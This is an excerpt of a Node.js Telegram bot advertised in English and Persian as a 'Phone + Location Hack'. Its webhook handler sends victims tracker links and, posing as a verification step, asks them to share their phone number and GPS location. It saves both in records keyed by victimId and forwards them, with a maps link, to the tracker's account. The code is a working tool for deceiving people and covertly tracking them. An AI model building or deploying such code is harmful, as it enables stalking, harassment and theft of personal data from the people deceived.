...
const BotUserSchema = new mongoose.Schema({
  ...
  requiresVerification: { type: Boolean, default: false }, // Flag to indicate if the current session requires verification
  currentTrackerId: { type: String, default: null }, // Store the tracker ID for the current session
  verificationStep: { type: String, default: 'none' }, // Track the current verification step: 'phone', 'location', 'both', or 'none'
});
...
const messages = {
  en: {
    ...
    menu: {
      ...
      phoneLocation: '❯ ℙ𝕙𝕠𝕟𝕖 + 𝕃𝕠𝕔𝕒𝕥𝕚𝕠𝕟 ℍ𝕒𝕔𝕜 📞📍', // New menu button
  ...
  fa: {
    ...
    menu: {
      ...
      phoneLocation: '❯ هـک شماره + موقعیت 📞📍', // New menu button
      language: '𝐂𝐡𝐚𝐧𝐠𝐞 𝐋𝐚𝐧𝐠 | تغییر زبان',
    },
...
const mainMenuKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      ...
      [{ text: messages[lang].menu.phoneLocation, callback_data: 'menu_phone_location' }], // New button
...
const adminMenuKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [
        { text: messages[lang].adminMenu.stats, callback_data: 'admin_stats' },
        { text: messages[lang].adminMenu.broadcast, callback_data: 'admin_broadcast' },
      ],
      [
        { text: messages[lang].adminMenu.setChannel, callback_data: 'admin_set_channel' },
        { text: messages[lang].adminMenu.blockUser, callback_data: 'admin_block_user' },
      ],
      [
        { text: messages[lang].adminMenu.unblockUser, callback_data: 'admin_unblock_user' },
        { text: messages[lang].adminMenu.back, callback_data: 'admin_back' },
      ],
    ],
  },
});
...
// Helper Functions
const encodeBase64 = (data, safe = false) => {
  const encoded = Buffer.from(data).toString('base64');
  return safe ? encoded.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '') : encoded;
};

const shortenUrl = async (url, chatId, type) => {
  return new Promise((resolve, reject) => {
    isgd.shorten(url, (res) => {
      if (res.startsWith('Error')) {
        console.error(`Error shortening URL for ${type} (chat ${chatId}):`, res);
        resolve(url);
      } else {
        resolve(res);
      }
  ...
  for (const user of users) {
    try {
      ...
      if (message.photo) {
        ...
        await bot.telegram.sendMessage(user.userId, message.text, { parse_mode: 'Markdown' });
      }
      success++;
    } catch (error) {
      failed++;
...
module.exports = async (req, res) => {
  try {
    ...
    const botToken = req.headers['x-telegram-bot-api-secret-token'];
    if (!botToken) {
      return res.status(401).json({ error: 'Unauthorized: Missing bot token' });
    }
    ...
    const userId = update.message?.from?.id?.toString() || update.callback_query?.from?.id?.toString();
    const messageId = update.message?.message_id || update.callback_query?.message?.message_id;
    const text = update.message?.text;

    if (!chatId || !userId) {
      return res.status(400).json({ error: 'Invalid update: Missing chatId or userId' });
    }
    ...
    if (!user) {
      ...
      await bot.telegram.sendMessage(
        botInfo.creatorId,
        messages['en'].newUserNotification(user.username, userId, user.referredBy, totalUsers)
      );
    }
    ...
    if (user.isBlocked) {
      await bot.telegram.sendMessage(chatId, messages[user.language].banned);
      return res.status(200).json({ ok: true });
    }

    const channelInfo = await Channel.findOne({ botToken }) || new Channel({ botToken });
    ...
    if (text?.startsWith('/start')) {
      ...
      let trackerId = null;
      let verificationStep = 'none';

      if (params.length > 1) {
        const referral = params[1];
        if (referral.startsWith('free_')) {
          trackerId = referral.replace('free_', '');
          requiresVerification = true;
          verificationStep = 'phone';
        } else if (referral.startsWith('pro_')) {
          trackerId = referral.replace('pro_', '');
          requiresVerification = true;
          verificationStep = 'location';
        } else if (referral.startsWith('ref_')) {
          trackerId = referral.replace('ref_', '');
          requiresVerification = true;
          verificationStep = 'both';
        } else {
          referredBy = referral;
        }
      }
      ...
      if (requiresVerification) {
        ...
        user.verificationStep = verificationStep;
        await user.save();

        if (verificationStep === 'phone' || verificationStep === 'both') {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].sharePhoneNumberMessage,
            sharePhoneNumberKeyboard(lang)
          );
        } else if (verificationStep === 'location') {
          await bot.telegram.sendMessage(
            chatId,
      ...
      if (referredBy !== 'none') {
        ...
        if (referrer) {
          ...
          await bot.telegram.sendMessage(
            referredBy,
            messages[referrer.language].referralNotification(user.username, referrer.referralCount),
            mainMenuKeyboard(referrer.language)
          );
        }
      }
    ...
    if (update.message?.contact) {
      if (!user.requiresVerification || !user.currentTrackerId) {
        await bot.telegram.sendMessage(chatId, messages[lang].noVerificationNeeded, mainMenuKeyboard(lang));
        return res.status(200).json({ ok: true });
      }

      const phoneNumber = update.message.contact.phone_number;
      let trackedData = await TrackedData.findOne({ botToken, victimId: userId, trackerId: user.currentTrackerId });
      if (!trackedData) {
        trackedData = new TrackedData({
          botToken,
          victimId: userId,
          victimUsername: user.username,
          trackerId: user.currentTrackerId,
        });
      }
      trackedData.phoneNumber = phoneNumber;
      await trackedData.save();

      await bot.telegram.sendMessage(
        user.currentTrackerId,
        messages['en'].phoneNumberNotification(user.username, userId, phoneNumber)
      );
    ...
    if (update.message?.location) {
      ...
      trackedData.latitude = latitude;
      trackedData.longitude = longitude;
      await trackedData.save();

      await bot.telegram.sendMessage(
        user.currentTrackerId,
        messages['en'].locationNotification(user.username, userId, latitude, longitude, mapsLink)
      );
      await bot.telegram.sendLocation(user.currentTrackerId, latitude, longitude);
    ...
    // Handle text commands for admin panel and verification cancellation
    if (text) {
      ...
      if (text === '/admin' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.sendMessage(chatId, messages[lang].adminPanel, adminMenuKeyboard(lang));
        return res.status(200).json({ ok: true });
      }

      if (user.adminState === 'awaiting_broadcast' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
    ...
    if (update.callback_query) {
      ...
      if (callbackData === 'lang_en') {
        ...
        try {
          ...
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].phoneLocationMessage(phoneUrl, locationUrl, bothUrl),
            {
              parse_mode: 'Markdown',
      ...
      else if (callbackData === 'admin_stats' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        const totalUsers = await BotUser.countDocuments({ botToken });
        const createdAt = new Date(botInfo.createdAt * 1000).toISOString().split('T')[0];
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].statsMessage(botInfo.username, totalUsers, createdAt, mainChannel, customChannel),
          adminMenuKeyboard(lang)
        );
        await bot.telegram.answerCbQuery(callbackQueryId);
      }

      else if (callbackData === 'admin_broadcast' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        const totalUsers = await BotUser.countDocuments({ botToken, hasJoined: true, isBlocked: false });
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          ...
          {
            reply_markup: {
              keyboard: [[{ text: messages[lang].cancel }]],
              resize_keyboard: true,
              one_time_keyboard: true,
            },
          }
      ...
      else if (callbackData === 'admin_set_channel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
      ...
      else if (callbackData === 'admin_block_user' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].blockPrompt,
          {
            reply_markup: {
              keyboard: [[{ text: messages[lang].cancel }]],
              resize_keyboard: true,
      ...
      else if (callbackData === 'admin_unblock_user' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].unblockPrompt,
          {
            reply_markup: {
              keyboard: [[{ text: messages[lang].cancel }]],
              resize_keyboard: true,
      ...
      else if (callbackData === 'admin_back' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].welcome(user.username),
